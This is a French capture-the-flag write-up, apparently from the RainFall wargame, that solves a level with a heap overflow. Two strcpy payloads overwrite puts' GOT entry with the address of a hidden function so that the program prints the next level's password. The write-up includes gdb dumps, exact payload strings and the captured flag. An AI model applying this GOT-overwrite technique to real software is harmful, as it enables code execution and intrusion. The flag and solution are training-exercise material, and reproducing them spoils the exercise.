# Level 7

Ce niveau est très similaire au [niveau précédent](/level6/README.md), cette fois on peut voir que le binaire ouvre le fichier `/home/user/level8/.pass` et récupère son contenu sans l'afficher.  
Une fonction `m` est présente mais pas utilisée, cette fonction affiche le contenu du fichier `.pass`.

En examinant le code, on peut voir qu'il `malloc` 2 structures et copie les `argv` 1 et 2 dans le pointeur de la structure :
   1. Avec le premier `strcpy`, nous pouvons réecrire l'addresse du pointeur de la deuxième structure par celle de la fonction `puts` et copier à cette adresse celle de notre fonction `m`.
      - `objdump -R level7` nous apprend que `puts` est à l'adresse `08049928` dans la [*Global Offset Table*](https://en.wikipedia.org/wiki/Global_Offset_Table).
      - L'allocation mémoire sur la *heap* est continue. On sait que le malloc d'une `struct level7` pèse 8 octets (un simple `disas main` depuis `gdb` suffit pour le confirmer).
      - Le premier `strcpy` écrit dans `structOne->*buffer` ; le second va écrire dans `structTwo->*buffer`. Le but de notre premier exploit est d'écraser le contenu de `structTwo->buffer` pour modifier l'adresse où le contenu de `argv[2]` sera copié. Il nous faudra 20 octets de remplissage avant d'écrire l'adresse de `puts` dans `structTwo->buffer`.
      - Notre premier exploit sera donc la forme : `python -c 'print "B"*20 + "\x28\x99\x04\x08"'`.
   2. Avec le second `strcpy`, nous allons placer l'adresse de la fonction `m`, de façon à ce qu'au moment d'appeller `puts`, ce soit en fait `m` qui soit appellée et exécutée.
      - Avec `gdb`, on détermine l'adresse de `m` : `0x80484f4`.
      - Notre second exploit sera donc `python -c 'print "\xf4\x84\x04\x08"'`.

```shell
level7@RainFall:~$ gdb level7
(gdb) info func
All defined functions:
Non-debugging symbols:
[...]
0x080484f4  m
0x08048521  main
[...]
(gdb) disas main
Dump of assembler code for function main:
[...]
   0x08048531 <+16>:	call   0x80483f0 <malloc@plt>
   0x08048536 <+21>:	mov    %eax,0x1c(%esp)
   0x0804853a <+25>:	mov    0x1c(%esp),%eax
   0x0804853e <+29>:	movl   $0x1,(%eax)
   0x08048544 <+35>:	movl   $0x8,(%esp)
   0x0804854b <+42>:	call   0x80483f0 <malloc@plt>
   0x08048550 <+47>:	mov    %eax,%edx
   0x08048552 <+49>:	mov    0x1c(%esp),%eax
   0x08048556 <+53>:	mov    %edx,0x4(%eax)
   0x08048559 <+56>:	movl   $0x8,(%esp)
   0x08048560 <+63>:	call   0x80483f0 <malloc@plt>
   0x08048565 <+68>:	mov    %eax,0x18(%esp)
   0x08048569 <+72>:	mov    0x18(%esp),%eax
   0x0804856d <+76>:	movl   $0x2,(%eax)
   0x08048573 <+82>:	movl   $0x8,(%esp)
   0x0804857a <+89>:	call   0x80483f0 <malloc@plt>
[...]
   0x080485a0 <+127>:	call   0x80483e0 <strcpy@plt>
[...]
   0x080485bd <+156>:	call   0x80483e0 <strcpy@plt>
   0x080485c2 <+161>:	mov    $0x80486e9,%edx
   0x080485c7 <+166>:	mov    $0x80486eb,%eax
   0x080485cc <+171>:	mov    %edx,0x4(%esp)
   0x080485d0 <+175>:	mov    %eax,(%esp)
   0x080485d3 <+178>:	call   0x8048430 <fopen@plt>
   0x080485d8 <+183>:	mov    %eax,0x8(%esp)
   0x080485dc <+187>:	movl   $0x44,0x4(%esp)
   0x080485e4 <+195>:	movl   $0x8049960,(%esp)
   0x080485eb <+202>:	call   0x80483c0 <fgets@plt>
   0x080485f0 <+207>:	movl   $0x8048703,(%esp)
   0x080485f7 <+214>:	call   0x8048400 <puts@plt>
   0x080485fc <+219>:	mov    $0x0,%eax
   0x08048601 <+224>:	leave
   0x08048602 <+225>:	ret
End of assembler dump.
(gdb) disas m
Dump of assembler code for function m:
   0x080484f4 <+0>:	push   %ebp
   0x080484f5 <+1>:	mov    %esp,%ebp
   0x080484f7 <+3>:	sub    $0x18,%esp
   0x080484fa <+6>:	movl   $0x0,(%esp)
   0x08048501 <+13>:	call   0x80483d0 <time@plt>
   0x08048506 <+18>:	mov    $0x80486e0,%edx
   0x0804850b <+23>:	mov    %eax,0x8(%esp)
   0x0804850f <+27>:	movl   $0x8049960,0x4(%esp)
   0x08048517 <+35>:	mov    %edx,(%esp)
   0x0804851a <+38>:	call   0x80483b0 <printf@plt>
   0x0804851f <+43>:	leave
   0x08048520 <+44>:	ret
End of assembler dump.
(gdb) x/s 0x80486eb
0x80486eb:	 "/home/user/level8/.pass"
(gdb) r BBBB AAAA
Starting program: /home/user/level7/level7 BBBB AAAA
Program received signal SIGSEGV, Segmentation fault.
0xb7e90ba7 in fgets () from /lib/i386-linux-gnu/libc.so.6
(gdb) info variables
All defined variables:
Non-debugging symbols:
[...]
0x08049908  _GLOBAL_OFFSET_TABLE_
[...]
(gdb) x/24a 0x08049908
0x8049908 <_GLOBAL_OFFSET_TABLE_>:	0x804983c <_DYNAMIC>	0xb7fff918	0xb7ff26a0	0x80483b6 <printf@plt+6>
0x8049918 <fgets@got.plt>:	0xb7e90b70 <fgets>	0x80483d6 <time@plt+6>	0xb7eb8aa0	0xb7ea4e70 <malloc>
0x8049928 <puts@got.plt>:	0x8048406 <puts@plt+6>	0x8048416 <__gmon_start__@plt+6>	0xb7e453e0 <__libc_start_main>	0xb7e90e60 <fopen>
0x8049938 <data_start>:	0x0	0x0	0x0	0x0
[...]
0x8049968 <c+8>:	0x0	0x0	0x0	0x0
0x8049978 <c+24>:	0x0	0x0	0x0	0x0
0x8049988 <c+40>:	0x0	0x0	0x0	0x0
0x8049998 <c+56>:	0x0	0x0	0x0	0x0
0x80499a8 <c+72>:	0x0	0x0	0x0	0x0
[...]
0x8049ff8:	0x0	0x0	0x0	0x11
0x804a008:	0x1	0x804a018	0x0	0x11
0x804a018:	0x42424242	0x0	0x0	0x11
0x804a028:	0x2	0x804a038	0x0	0x11
0x804a038:	0x41414141	0x0	0x0	0x20fc1
0x804a048:	0xfbad240c	0x0	0x0	0x0
0x804a058:	0x0	0x0	0x0	0x0
0x804a068:	0x0	0x0	0x0	0x0
(gdb) quit
~ ./level7 `python -c 'print "B"*20+"\x28\x99\x04\x08"'` `python -c 'print "\xf4\x84\x04\x08"'`
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9 - 1599750175
```